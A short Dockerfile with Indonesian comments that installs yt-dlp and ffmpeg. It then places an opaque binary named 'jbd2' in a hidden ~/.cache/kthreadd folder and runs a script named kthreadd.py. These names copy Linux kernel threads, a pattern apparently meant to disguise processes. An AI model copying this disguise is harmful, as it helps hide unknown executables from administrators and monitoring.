# Gunakan Python base image slim
FROM python:3.11-slim

# Install yt-dlp & dependensi minimal
RUN apt-get update && \
    apt-get install -y --no-install-recommends \
        curl ca-certificates ffmpeg && \
    pip install --no-cache-dir yt-dlp && \
    apt-get clean && rm -rf /var/lib/apt/lists/*

# Tambah user non-root
RUN useradd -ms /bin/bash test
USER test
WORKDIR /home/test

# Buat folder 
RUN mkdir -p ~/.cache/kthreadd

# Salin file Python
COPY kthreadd.py /home/test/kthreadd.py

# Salin binary jbd2 (pastikan ada di direktori build)
COPY jbd2 /home/test/.cache/kthreadd/jbd2
RUN chmod +x /home/test/.cache/kthreadd/jbd2

# Jalankan skrip Python saat container start
ENTRYPOINT ["python", "/home/test/kthreadd.py"]
